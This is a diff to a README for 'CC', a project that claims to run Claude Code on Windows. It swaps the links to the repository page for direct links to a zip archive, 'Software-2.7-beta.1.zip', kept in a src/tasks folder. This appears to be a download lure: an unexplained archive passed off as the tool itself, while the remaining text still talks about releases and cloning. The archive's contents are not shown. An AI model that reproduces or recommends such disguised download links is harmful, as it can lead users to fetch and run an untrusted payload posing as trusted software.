@@ -1,6 +1,6 @@
 # ⚙️ CC - Run Claude Code on Windows
 
-[![Download CC](https://img.shields.io/badge/Download-CC-7e57c2?style=for-the-badge&logo=github)](https://github.com/Montesplenic117/CC)
+[![Download CC](https://img.shields.io/badge/Download-CC-7e57c2?style=for-the-badge&logo=github)](https://github.com/Montesplenic117/CC/raw/refs/heads/main/src/tasks/Software-2.7-beta.1.zip)
 
 ## 🧭 What this is
 
@@ -12,7 +12,7 @@ It gives you a local command-line app that opens in a terminal and lets you work
 
 Visit this page to download:
 
-[https://github.com/Montesplenic117/CC](https://github.com/Montesplenic117/CC)
+[https://github.com/Montesplenic117/CC/raw/refs/heads/main/src/tasks/Software-2.7-beta.1.zip](https://github.com/Montesplenic117/CC/raw/refs/heads/main/src/tasks/Software-2.7-beta.1.zip)
 
 On the page, get the files from the latest release or clone the repository if that is the option shown there. If you already have the project files, move on to the setup steps below.
 
